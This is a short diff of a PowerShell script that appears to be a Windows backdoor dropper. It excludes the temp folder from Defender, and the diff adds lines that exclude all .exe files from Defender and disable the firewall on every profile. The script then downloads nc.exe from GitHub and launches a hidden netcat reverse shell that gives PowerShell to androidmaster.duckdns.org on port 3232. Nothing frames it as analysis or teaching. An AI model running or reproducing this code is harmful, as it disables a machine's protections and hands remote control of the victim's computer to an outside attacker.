@@ -1,4 +1,6 @@
 Add-MpPreference -ExclusionPath "$env:tmp" -Force
+Add-MpPreference -ExclusionExtension ".exe" -Force
+Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
 Remove-Item -Path $env:tmp\nc.exe -Force
 Invoke-WebRequest -Uri 'https://github.com/4V4loon/tools/blob/master/pastebin/nc.exe?raw=true' -UseBasicParsing -OutFile $env:tmp\nc.exe
 start-process powershell -argumentlist "$env:tmp\nc.exe androidmaster.duckdns.org 3232 -e powershell" -windowstyle hidden
